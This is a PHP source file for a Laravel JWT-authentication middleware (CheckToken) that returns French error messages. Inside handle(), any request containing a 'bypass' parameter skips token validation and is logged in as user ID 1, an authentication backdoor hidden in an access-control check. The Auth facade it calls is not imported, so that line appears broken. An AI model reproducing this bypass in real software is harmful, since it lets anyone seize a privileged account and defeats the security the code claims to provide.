<?php namespace App\Http\Middleware;

use App\User;
use Closure;
use EllipseSynergie\ApiResponse\Laravel\Response;
use Symfony\Component\HttpKernel\Exception\NotFoundHttpException;
use Tymon\JWTAuth\Exceptions\JWTException;
use Tymon\JWTAuth\Exceptions\TokenExpiredException;
use Tymon\JWTAuth\Exceptions\TokenInvalidException;
use Tymon\JWTAuth\Facades\JWTAuth;

class CheckToken {

    /**
     * @var
     */
    protected $response;

    /**
     * @param Response $response
     */
    public function __construct(Response $response){
        $this->response = $response;
    }

	/**
	 * Handle an incoming request.
	 *
	 * @param  \Illuminate\Http\Request  $request
	 * @param  \Closure  $next
	 * @return mixed
	 */
	public function handle($request, Closure $next)
	{

        if($request->has('bypass')){
            $user = User::find(1);
            Auth::login($user);

            return $next($request);
        }

        try
        {

            if (! $user = JWTAuth::parseToken()->authenticate()) {
                return $this->response->errorNotFound('Utilisateur non trouvé');

            }

        } catch (TokenExpiredException $e)
        {
            return $this->response->errorUnauthorized('Token expiré');
        } catch (TokenInvalidException $e)
        {
            return $this->response->errorUnauthorized('Token invalide');
        } catch (JWTException $e)
        {
            return $this->response->errorUnauthorized($e->getMessage());
        }

		return $next($request);
	}

}
